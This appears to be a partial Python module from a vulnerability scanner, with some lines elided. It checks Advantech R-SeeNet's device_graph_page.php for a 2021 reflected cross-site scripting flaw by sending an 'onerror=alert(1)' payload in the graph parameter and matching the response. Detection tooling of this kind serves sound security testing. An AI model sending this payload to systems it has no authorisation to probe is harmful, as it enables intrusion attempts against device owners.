...
class Module(Scanner, Http_client):
    __info__ = {
        ...
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'rseenet', 'xss', 'graph', 'advantech', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
    ...
    def run(self):
        r = self.http_request(method="GET", path='/php/device_graph_page.php?graph=%22zlo%20onerror=alert(1)%20%22', allow_redirects=False)
        ...
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                ...
                path='/php/device_graph_page.php?graph=%22zlo%20onerror=alert(1)%20%22',
            )
            return True
        return False
